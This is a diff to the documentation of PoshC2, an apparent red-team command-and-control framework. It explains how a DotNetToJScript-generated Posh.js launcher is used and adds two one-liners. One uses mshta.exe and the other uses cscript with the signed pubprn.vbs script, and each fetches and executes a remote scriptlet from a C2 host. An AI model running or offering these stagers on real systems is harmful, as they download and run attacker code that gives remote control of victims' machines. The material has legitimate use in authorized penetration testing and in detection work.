@@ -4,3 +4,13 @@
 Utilising `DotNetToJScript <https://github.com/tyranid/DotNetToJScript>`_, PoshC2 creates a "Posh.js" file that can either be embedded into a HTA or called directly as a .js file. The tool generates JScript or VBScript that has a bootstrap which calls an arbitrary .NET Assembly and class, in this case the PoshC2 binary. 
 
 In PoshC2 this is utilised in the one liners which are called by "cscript.exe".
+
+NOTE: This does not work with untrusted SSL certificates if using over HTTPS:
+
+.. code-block:: python
+	
+	mshta.exe vbscript:GetObject("script:https://www.c2.com/news/j9hau_js")(window.close)
+
+.. code-block:: python
+	
+	cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers "script:https://www.c2.com/news/j9hau_js"
